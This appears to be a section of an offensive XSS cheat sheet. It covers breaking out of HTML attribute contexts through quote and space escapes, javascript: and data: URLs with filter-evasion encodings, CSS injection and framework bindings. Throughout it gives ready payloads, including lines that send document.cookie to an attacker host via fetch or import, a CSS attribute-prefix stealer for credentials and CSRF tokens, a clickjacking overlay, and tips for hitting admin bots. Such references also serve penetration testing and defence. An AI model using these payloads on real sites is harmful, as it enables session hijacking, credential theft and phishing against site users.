# Attribute context — injection inside a tag's attribute value

The value lands inside a quoted or unquoted attribute:

```html
<input value="USER_INPUT">
<div title="USER_INPUT">
<a href="USER_INPUT">
<img alt='USER_INPUT'>
```

Three sub-contexts with different breakouts: quoted-value escape,
unquoted-value escape, and URL-scheme attributes (href/src/action).

---

## 1. Quoted-value escape — `"` or `'` breaks out

The attribute is `value="USER_INPUT"` — a `"` in your input closes
the attribute and opens the tag for new attributes/elements:

```html
input:  "><img src=x onerror=alert(1)>
result: <input value=""><img src=x onerror=alert(1)>">

input:  "><svg onload=alert(1)>
input:  "><script>alert(1)</script>
input:  " autofocus onfocus=alert(1) x="      -- stay in-tag, add handler
input:  " onmouseover=alert(1) x="            -- hover variant
input:  " onfocus=alert(1) autofocus x="       -- autofire variant
```

The pattern `"...="` at the end absorbs the tag's own closing quote
so the tag stays well-formed.

Single-quoted `value='USER_INPUT'` — same with `'`:

```html
'><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
' autofocus onfocus=alert(1) x='
```

Both-quote tests — if you don't know which quote type:

```html
"><img src=x onerror=alert(1)>       -- try " first
'><img src=x onerror=alert(1)>       -- then '
"><x>                               -- diagnostic: which survived
```

If `"` is stripped but `'` survives → the context is single-quoted
(or the filter only strips `"`). Use `'`.

---

## 2. Unquoted-value escape — space breaks out

`value=USER_INPUT` (no quotes) — space or `/` terminates the value:

```html
input:  x onfocus=alert(1) autofocus
result: <input value=x onfocus=alert(1) autofocus>
        -- new attributes just follow the space

input:  x><img src=x onerror=alert(1)>
result: <input value=x><img src=x onerror=alert(1)>>
        -- > closes the tag, new tag follows
```

Unquoted values can't contain spaces — but the BREAKOUT can start
with a space. HTML5 allows `'` `"` `` ` `` `` ` `` `<` `=` as
unquoted-value terminators too.

---

## 3. Backtick attribute — template-literal context

Some frameworks render `attr=`USER_INPUT`` (backtick-quoted — yes,
HTML5 tolerates it):

```html
<input value=`x` onfocus=alert(1) autofocus>
input:  x` onfocus=alert(1) autofocus `
```

Backtick-quoted values break on backtick. Rare in server output,
common in JS-built markup.

---

## 4. URL-scheme attributes — `javascript:`/`data:` inside href/src

The value lands in an attribute whose content is a URL:

```html
<a href="USER_INPUT">x</a>
  → javascript:alert(1)            -- the scheme IS the payload
  → javascript:alert(document.cookie)
  → JaVaScRiPt:alert(1)            -- case variant
  → java\tscript:alert(1)          -- tab inside scheme (browser strips)
  → javascript&colon;alert(1)      -- entity colon
  → &#106;avascript:alert(1)       -- entity first-char
  → data:text/html,<script>alert(1)</script>   -- data-URI page
  → vbscript:msgbox(1)             -- IE legacy
```

Where it fires:

| Attribute | `javascript:` runs |
|---|---|
| `<a href>` | on CLICK only |
| `<area href>` | on click |
| `<iframe src>` | on load |
| `<form action>` | on submit |
| `<button formaction>` | on click |
| `<input formaction>` | on click |
| `<base href>` | poisons relative URLs |
| `<object data>` | on load (data: more reliable) |
| `<embed src>` | on load |
| `<script src>` | NEVER (script src needs a real script URL) |
| `<img src>` | NEVER (img loads it as an image — decode fails) |
| `<svg><a href>` | on click |
| `<link href>` | stylesheet — `data:text/css` variants |

`javascript:` inside `href` needs a click — for admin-bot targets
prefer `iframe src=` or a tag that navigates itself. But `formaction`
on a button the bot clicks (login forms!) is gold — the bot's own
click fires it.

### URL-filter evasion inside the attribute

```javascript
// 'javascript' string blocked:
javascri&#112;t:alert(1)       -- 'p' as entity
java&#115;cript:alert(1)       -- 's' as entity
&#x6a;avascript:alert(1)        -- 'j' as hex entity
%6aavascript:alert(1)           -- pct-encoded j (if decoded once)
javascript&colon;alert(1)        -- named entity colon
javascript&#58;alert(1)          -- decimal colon
javascript&#x3a;alert(1)         -- hex colon
java\tscript:alert(1)            -- tab inside name (tab stripped)
java\nscript:alert(1)            -- newline inside name
ja vascript:alert(1)             -- space — WORKS in some parsers
     javascript:alert(1)         -- leading space stripped
```

The colon-entity family is the strongest — filters regex
`javascript:` but miss `javascript&#58;`.

### javascript: payload size

```javascript
javascript:alert(1)
javascript:alert(document.cookie)
javascript:fetch('//me/?c='+document.cookie)
javascript:eval(location.hash.slice(1))          -- hash-carried code
javascript:eval(name)                            -- window.name carrier
javascript:import('//me/x.js')                   -- module load
javascript:`fetch('//me/?c='+document.cookie)`   -- no parens
```

---

## 5. `srcset` / `src` attribute — image-loading tricks

```html
<img src="USER_INPUT">
  → x" onerror="alert(1)              -- escape + handler
  → data:image/svg+xml,...            -- svg image (svg can carry
                                         script in some contexts —
                                         but img-loaded SVG does NOT
                                         execute script! dead end)
  → javascript:alert(1)               -- dead — img loads it as img
  → //evil.com/x.png                  -- external load = leak confirm
```

`<img src>` CANNOT run `javascript:` — the parser fetches it as an
image. The only img-src code path is escape-then-onerror.

---

## 6. `style` attribute — CSS injection

```html
<div style="USER_INPUT">
  → background:url(//me/?c=…)         -- exfil via CSS (no JS!)
  → width:expression(alert(1))         -- IE-only, dead in modern
  → position:fixed;top:0;left:0;width:100%;height:100%;z-index:999
    -- overlay for clickjacking/phishing
  → behavior:url(xss.htc)              -- IE HTA — dead
```

CSS exfil doesn't need JS — the URL fetch carries the data:
```css
background:url('//me/?c='+document.cookie)   -- WRONG: no string concat
background:url(//me/?c=SECRET)                -- static: what you inject IS the url
```

CSS can't read JS values — exfil is limited to what the selector
engine reaches: `[value^=a]` attribute-prefix leaks:

```css
input[value^=a]{background:url(//me/a)}
input[value^=b]{background:url(//me/b)}
   → the one that fires leaks the first char of the value
   → classic CSS-only credential/CSRF-token stealer
   → needs a second injection or <style> context for full alphabet
```

---

## 7. Event-handler attribute contexts — value lands INSIDE a handler

The value lands inside an existing `on*=` attribute:

```html
<img src=x onerror="USER_INPUT">
  → alert(1)                          -- the value IS the JS — direct
  → alert(document.cookie)
  → "><script>alert(1)</script>        -- escape + new tag
  → "&quot; bypass if " is escaped    -- entity-smuggled quote
```

Same for `onclick`, `onload`, `data-*` handlers. The value runs as
JS verbatim — no escape needed. This is the best landing spot.

---

## 8. `data-*` and framework attributes — the binding context

```html
<div data-x="USER_INPUT">             -- plain data attr — harmless
                                      unless JS reads it into a sink
<div ng-bind-html="USER_INPUT">        -- Angular binding — expression
<div v-html="USER_INPUT">              -- Vue directive — HTML inject
<div :inner-h-t-m-l.prop="USER_INPUT"> -- Vue prop-binding
<div x-html="USER_INPUT">              -- Alpine — HTML inject
```

Framework-bound attributes are DOM-sinks — the attribute value is
evaluated/assigned by the framework. `framework-sinks.md` covers it.

---

## 9. The attribute escape cheat-table

| Landing point | Escape | Payload |
|---|---|---|
| `value="X"` | `">` | `"><img src=x onerror=alert(1)>` |
| `value='X'` | `'>` | `'><svg onload=alert(1)>` |
| `value=X` | ` ` | `x onfocus=alert(1) autofocus` |
| `href="X"` | scheme | `javascript:alert(1)` |
| `src="X"` | escape | `x" onerror="alert(1)` |
| `style="X"` | CSS | `background:url(//me)` |
| `onerror="X"` | none | `alert(1)` direct |
| `data-x="X"` | `"` | escape or framework expr |
| `title="X"` | `"` | `"><svg onload=alert(1)>` |

When quotes are filtered → `filter-bypass.md` §3.
When `javascript:` is filtered → `protocols.md`.
